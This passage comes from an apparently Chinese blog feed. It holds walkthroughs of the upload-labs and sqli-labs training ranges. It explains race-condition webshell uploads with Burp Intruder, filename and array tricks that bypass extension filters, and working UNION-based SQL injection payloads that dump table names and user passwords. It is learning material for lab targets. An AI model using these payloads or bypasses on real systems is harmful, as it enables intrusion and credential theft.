punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p>可以使用条件竞争进行绕过</p><p>我们上传的文件是有缓存的，move_uploaded_file(a,b)就是把a移到b，所以move_uploaded_file($temp_file, $upload_file)就是把缓存移动到UPLOAD_PATH . ‘/’ . $file_name，紧接着会判断我们的文件的后缀了，如果不是规定的后缀就会被unlink(删除)。</p><p>条件竞争就是我们不断传上去php木马文件，在被移动到UPLOAD_PATH . ‘/’ . $file_name之后，在没有来得及被unlink处理之前去访问这个文件。</p><p>用burp抓包开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>因为没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="/2020/11/16/upload-labs/image-20201121114724061.png" alt="image-20201121114724061" loading="lazy"></p><p>最后发现好几个成功</p><p><img src="/2020/11/16/upload-labs/image-20201121114247275.png" alt="image-20201121114247275" loading="lazy"></p><p><strong>PS：之前本地一直竞争不过，然后把电脑弄卡就轻轻松松成功了，就离谱</strong></p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h2><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多<br>不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p><h2 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19-/.绕过"></a>Pass-19-/.绕过</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>move_uploaded_file会忽略掉文件末尾的/.<br>所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php。最后通过文件包含访问</p><p><img src="/2020/11/16/upload-labs/image-20201121164257255.png" alt="image-20201121164257255" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201121164351433.png" alt="image-20201121164351433" loading="lazy"></p><p>后面发现，将保存名字加上**/.**就行了</p><p><img src="/2020/11/16/upload-labs/image-20201121165106847.png" alt="image-20201121165106847" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201121165121863.png" alt="image-20201121165121863" loading="lazy"></p><h2 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20-数组+/.绕过"></a>Pass-20-数组+/.绕过</h2><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//检查MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token comment">//检查文件名</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传成功！"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$file为数组的话，就不用经过explode处理再变成数组，我们直接上传数组的话，增加了我么的控制性。<br>end($file)会经过后缀名检测，所以数组最后一个一定是白名单中的后缀。<br>$file_name = reset($file) . ‘.’ . $file[count($file) - 1];通常$file[count($file) - 1]和end($file)都指向数组最后一个元素，但是在这里如果这样，那么上传上去的将只能是图片,所以我们可以抓包这样修改</p><p><img src="/2020/11/16/upload-labs/image-20201121172723933.png" alt="image-20201121172723933" loading="lazy"></p><p>成功</p><p><img src="/2020/11/16/upload-labs/image-20201121172745188.png" alt="image-20201121172745188" loading="lazy"></p><p>陆陆续续做了几天，upload-labs这个靶场到这来算是完成了，还是学到了挺多东西的，比如文件上传的简单绕过，简单木马的制作等等。</p><p>作者水平不足，有很多写的不好的地方敬请谅解。</p>]]></content>
      
      
      <categories>
          
          <category> upload-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli_labs1-20</title>
      <link href="2020/11/06/sqli-labs1-20/"/>
      <url>2020/11/06/sqli-labs1-20/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqli-labs1-20"><a href="#sqli-labs1-20" class="headerlink" title="sqli_labs1-20"></a>sqli_labs1-20</h1><p>学习sql注入前可以去<a href="https://www.runoob.com/sql/sql-tutorial.html">菜鸟教程</a>看看语法</p><p>使用phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。</p><p> 另外– （–空格）在SQL内表示注释，但在URL中，如果在最后加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替– ，原因是+在URL被URL编码后会变成空格。</p><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>根据提示，可以知道只是个单引号注入的题目</p><p><img src="/2020/11/06/sqli-labs1-20/image-20201105194103266-1604667081397.png" alt="image-20201105194103266" loading="lazy"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> ?id<span class="token operator">=</span><span class="token number">1</span> 正常回显<span class="token number">2</span> ?id<span class="token operator">=</span><span class="token number">1</span>'显示错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105194954428-1604667081398.png" alt="image-20201105194954428" loading="lazy"></p><p><img src="/2020/11/06/sqli-labs1-20/image-20201105195020393-1604667081398.png" alt="image-20201105195020393" loading="lazy"></p><p>接下来就是常规的联合注入</p><p>使用order by 来测试表的列数</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'order by 3--+?id=1'</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105195843033-1604667081398.png" alt="image-20201105195843033" loading="lazy"><br>发现输入4显示错误，说明是三列</p><p>接下来使用联合查询</p><p><img src="/2020/11/06/sqli-labs1-20/image-20201107160953915.png" alt="image-20201107160953915" loading="lazy"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 只是为了保证<span class="token keyword">union</span>前后两个语句的列数相同，id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> 则是为了使前一个查询无返回结果从而返回第二个 <span class="token keyword">select</span> 的查询结果<span class="token punctuation">,</span>只需要将数字替换为相应的想要查询的信息即可<span class="token punctuation">.</span>比如：?id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span>下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105201629084-1604667081398.png" alt="image-20201105201629084" loading="lazy"></p><p><strong>爆表名</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105202757881-1604667081398.png" alt="image-20201105202757881" loading="lazy"></p><p><strong>爆列名</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name='</span>users'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105204014145-1604667081398.png" alt="image-20201105204014145" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201105203923813-1604667081398.png" alt="image-20201105203923813" loading="lazy"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>根据提示，是整形注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用<span class="token keyword">order</span> <span class="token keyword">by</span>测试，发现有<span class="token number">3</span>列?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+会报错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201333439-1604667081398.png" alt="image-20201106201333439" loading="lazy"></p><p><strong>接下来就是使用union联合查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201547214-1604667081398.png" alt="image-20201106201547214" loading="lazy"></p><p>接下来又是熟悉的爆库爆表爆列爆数据了</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106201838614-1604667081398.png" alt="image-20201106201838614" loading="lazy"></p><p>得到表security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202414193-1604667081398.png" alt="image-20201106202414193" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202736797-1604667081398.png" alt="image-20201106202736797" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span>?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106202955659-1604667081398.png" alt="image-20201106202955659" loading="lazy"></p><p><img src="/2020/11/06/sqli-labs1-20/image-20201106203036404-1604667081398.png" alt="image-20201106203036404" loading="lazy"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>根据提示</p><p>输入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106194645357-1604667081398.png" alt="image-20201106194645357" loading="lazy"></p><p>根据报错，发现是单引号加括号形成的查询语句，</p><p>尝试构造</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106194947946-1604667081398.png" alt="image-20201106194947946" loading="lazy"></p><p>正常回显</p><p>接着就是和less-1一样的步骤</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195226486-1604667081398.png" alt="image-20201106195226486" loading="lazy"></p><p>可以得到数据库名字security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span>security<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195450005-1604667081398.png" alt="image-20201106195450005" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">') union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name='</span>users'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106195750781-1604667081399.png" alt="image-20201106195750781" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token 